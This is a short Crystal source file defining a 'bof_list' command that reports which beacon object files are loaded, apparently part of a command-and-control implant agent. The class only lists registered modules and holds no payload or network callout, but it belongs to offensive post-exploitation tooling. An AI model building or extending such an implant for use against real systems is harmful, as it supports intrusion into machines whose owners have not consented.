require "./base"

module Dark::Agent::Commands
  class BofList < Base
    def name : String
      "bof_list"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      
      bofs = bof_registry.list
      
      if bofs.empty?
        MessageHandler.add_response(task_id, :success, "No BOFs currently loaded")
      else
        MessageHandler.add_response(task_id, :success, "Loaded BOFs:\n" + bofs.join("\n"))
      end
    end
  end
end